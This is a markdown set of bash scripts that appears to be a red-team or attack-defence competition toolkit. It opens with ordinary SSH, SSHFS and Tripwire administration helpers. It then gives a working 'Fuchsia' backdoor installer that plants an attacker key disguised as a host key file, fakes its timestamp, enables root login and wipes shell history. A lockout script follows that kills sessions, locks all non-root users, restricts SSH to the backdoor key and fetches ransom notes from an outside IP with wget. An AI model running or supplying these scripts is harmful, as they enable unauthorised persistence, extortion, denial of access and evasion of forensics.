# Scripts

### Copy Keys

```
#!/usr/bin/env bash

while [ true ]
do
    echo "Enter the IP address of the machine:"
    read IP
    echo "What hostname should we resolve to $IP?"
    read HOSTNAME
    ssh-copy-id root@$IP
    echo "$IP $HOSTNAME" | sudo tee -a /etc/hosts
    echo $HOSTNAME | sudo tee -a /etc/servers
    mkdir /servers/$HOSTNAME
    echo -e "All done!\n\n"
done
```


### Kill Other SSH Sessions

```
kill -9 `pgrep '^(bash|sh)' | grep -v $$`
```

### Mount SSHFS

```
#!/bin/bash

sudo mkdir -p /servers
sudo chown root:toads /servers
sudo chmod 0775 /servers

for s in $(cat /etc/servers); do
  sudo umount /servers/$s #>/dev/null 2>&1 || true
  rmdir /servers/$s #>/dev/null 2>&1 || true
  mkdir /servers/$s
  sshfs -o allow_other,ServerAliveInterval=20,reconnect root@$s:/ /servers/$s
done
```

### Procedurally Generate Tripwire Configuration

```
for S in `ls /servers`; do
  echo "( rulename = "$S", severity = 100)">>~/twpol.txt
  echo "{">>~/twpol.txt
  for D in `ls /servers/$S | grep -v dev | grep -v srv | grep -v proc`; do
    echo "/servers/$S/$D -> \$(ReadOnly) (recurse = true);">>~/twpol.txt
  done
  echo "}">>~/twpol.txt
done
```

### Fuchsia Backdoor Installer

```
echo "PUBKEY HERE" >> /etc/ssh/ssh_host_rsa2048_key.pub
touch -r /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa2048_key.pub
sed -i 's/\#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
kill -HUP $(pgrep -f `which sshd`)
history -c
echo "" > ~/.bash_history
```


### Fuchsia Lockout

```
who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'

echo "Kicked em out!"

cp /etc/passwd /etc/passwd.backup.shad0wfuchsia
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.shad0wfuchsia

echo "User table backed up"

echo "Locking users..."

for USERNAME in `cut -d: -f1 /etc/passwd | grep -v root`
do
  sudo passwd -l $USERNAME
done

echo "All users locked"

# Set authorized keyfile to ONLY backdoor key
sed -i 's/\AuthorizedKeysFile.*/AuthorizedKeysFile \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Disable password authentication
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# Remove any existing allowusers directive, replace with root only
sed -i 's/AllowUsers.*/\#/' /etc/ssh/sshd_config
echo -e ' \n' >>/etc/ssh/sshd_config
echo 'AllowUsers root' >> /etc/ssh/sshd_config

sed -i 's/Banner.*/\#/' /etc/ssh/sshd_config
sed -i 's/#Banner.*/\#/' /etc/ssh/sshd_config
echo 'Banner /etc/fuchsia_banner' >> /etc/ssh/sshd_config

echo "SSH Configuration finished"

rm /etc/motd
wget -O /etc/fuchsia_banner http://67.205.157.179/fus-nocolor.txt
wget -O /etc/nologin http://67.205.157.179/fus.txt

echo "Ransom notes installed"

cat >~/unfuck.sh <<EOL
#!/bin/bash

wget -qO - http://67.205.157.179/paid.txt

echo "Reverting changes..."
mv /etc/passwd.backup.shad0wfuchsia /etc/passwd
mv /etc/ssh/sshd_config.backup.shad0wfuchsia /etc/ssh/sshd_config
rm /etc/nologin
echo "" >/etc/fuchsia_banner

for USERNAME in \`cut -d: -f1 /etc/passwd | grep -v root\`
do
  sudo passwd -u $USERNAME
done

echo -e "System configuration restored.\nBye!"
rm -- "\$0"
EOL

kill -HUP $(pgrep -f `which sshd`)

echo "!!!CHANGE THE ROOT PASSWORD"

history -c
echo "" > ~/.bash_history
```
